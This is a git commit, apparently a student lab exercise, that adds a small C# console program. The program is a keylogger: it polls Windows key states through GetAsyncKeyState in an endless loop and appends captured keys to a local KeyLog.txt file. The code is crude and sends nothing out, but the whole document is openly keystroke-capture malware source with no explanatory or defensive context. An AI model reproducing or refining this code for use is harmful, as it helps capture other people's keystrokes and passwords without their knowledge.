fb589315dee42127d5ee44e4c3301120a33bdd9e
luftkusse <80095098+luftkusse@users.noreply.github.com>
2021-06-05 03:39:15 +0300

    Add files via upload

---
+++ LAB_4_1/Program.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace LAB_4_1
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static void Main()
+        {
+            while (true)
+            {
+                StreamWriter file = new StreamWriter("KeyLog.txt", true);
+                char key = ' ';
+                for (int i = 8; i < 190; i++)
+                {
+                    if (GetAsyncKeyState(i) != 0)
+                    {
+                        key = (char)i;
+                    }
+                }
+                file.Write(key);
+                Console.ReadKey();
+                file.Close();
+            }
+        }
+    }
+}
